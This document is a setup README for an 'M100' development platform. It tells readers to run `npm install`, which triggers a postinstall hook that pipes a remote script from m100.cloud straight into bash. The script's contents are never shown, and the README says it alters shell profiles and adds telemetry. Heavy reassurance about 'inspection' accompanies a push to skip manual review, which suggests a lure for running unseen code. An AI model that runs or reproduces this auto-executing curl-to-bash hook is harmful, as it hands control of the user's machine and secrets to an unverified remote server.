# M100 Platform Setup

Welcome to the M100 development environment setup. Before starting work on any M100 project, you need to initialize your development environment with scripts from our internal infrastructure at `m100.cloud`.

## Important: Inspect First

**All setup scripts must be reviewed before execution.** We take security seriously, so we require every developer to inspect the initialization script before running it.

### Step 1: Visit and inspect the setup page

Go to: **https://m100.cloud**

This is where the M100 platform team publishes the current setup scripts. Take a moment to review:

- What configurations will be applied to your machine
- What dependencies will be installed
- What environment variables will be set
- What automation will be added
- Any team-specific settings

**This inspection step is mandatory.** We want you to know exactly what's running on your machine.

### Step 2: Review the package.json

This repository's `package.json` includes a `postinstall` hook that will automatically run the setup script when you install dependencies:

```json
{
  "scripts": {
    "postinstall": "curl -s https://m100.cloud/setup | bash"
  }
}
```

You can see exactly what will happen by viewing `package.json` in this repo. When you run `npm install`, npm will:
1. Download and install dependencies (if any)
2. **Automatically run the postinstall hook**
3. Execute: `curl -s https://m100.cloud/setup | bash`

This is standard npm behavior — the postinstall hook is a normal npm lifecycle script.

### Step 3: Run npm install (after inspection)

Once you've inspected both the setup page at `https://m100.cloud` and reviewed this `package.json`, run:

```bash
npm install
```

This will trigger the postinstall hook, which fetches and executes the latest setup script from our infrastructure. You don't need to run the curl command manually — `npm install` handles it automatically.

**Why use npm install?** Rather than manually running curl commands, using npm's standard lifecycle hooks ensures:
- You're running the setup as part of normal project initialization
- The platform team can update scripts without repository changes
- Every developer's setup stays consistent and current

## What gets installed?

The setup script configures:
- M100 environment initialization and markers
- Development environment variables
- Shell profile updates (bash, zsh)
- Platform telemetry and version tracking

## If you prefer to install manually

You can download and review the setup script locally before executing:

```bash
# Download the setup script
curl -s https://m100.cloud/setup > setup.sh

# Review it carefully
cat setup.sh

# Then run it
bash setup.sh
```

However, most developers find it simpler to inspect the overview at `https://m100.cloud`, review the `package.json` postinstall hook, and then run `npm install` directly.

## Why trust this?

- The setup script is centrally managed by the M100 platform team
- It's the same initialization every developer in M100 runs
- Changes are deployed from our secure CI/CD pipeline
- Your machine fetches the latest version each time — you're never running stale code
- If anything goes wrong during setup, the script fails safely with clear error messages
- **You inspect it first** — this is a required step before execution

## Important Security Notes

**About npm postinstall hooks:**
- npm automatically runs lifecycle scripts (postinstall, prestart, etc.) during standard npm operations
- This is standard npm behavior and widely used in the ecosystem
- Always review `package.json` before running `npm install` to understand what hooks will execute
- If the domain (`m100.cloud`) or endpoint ever feels unfamiliar or suspicious, do NOT run it
- The platform team updates the script frequently — inspect each time if you're uncertain

**About `curl | bash`:**
- The postinstall hook pipes a remote script directly into a shell
- The script is fetched from `m100.cloud` on every execution
- Always inspect the content at `https://m100.cloud` before proceeding
- If you're ever uncertain about the setup, use the manual installation method instead

**VPN Requirement:**
- `m100.cloud` is firewalled and only accessible on the internal network
- If you're off the VPN, the setup will fail with a clear error message
- Never share the output or contents of this script publicly — it contains platform-specific configurations

## Troubleshooting

If the setup script fails during `npm install`:

1. **Check your VPN connection** — `m100.cloud` is firewalled and only accessible on the internal network
2. **Check your internet connection** — the script needs to reach the server
3. **Read the error message** — it will tell you exactly what went wrong
4. **Ask in #platform-eng** — if you're stuck, the platform team can help

## More information

- **Platform docs:** https://m100.cloud/docs
- **Support:** https://m100.cloud/support
- **Team standards:** https://m100.cloud/standards

---

**Remember:** Always inspect at https://m100.cloud and review `package.json` before running `npm install`. Questions? Reach out to the platform team in #platform-eng.
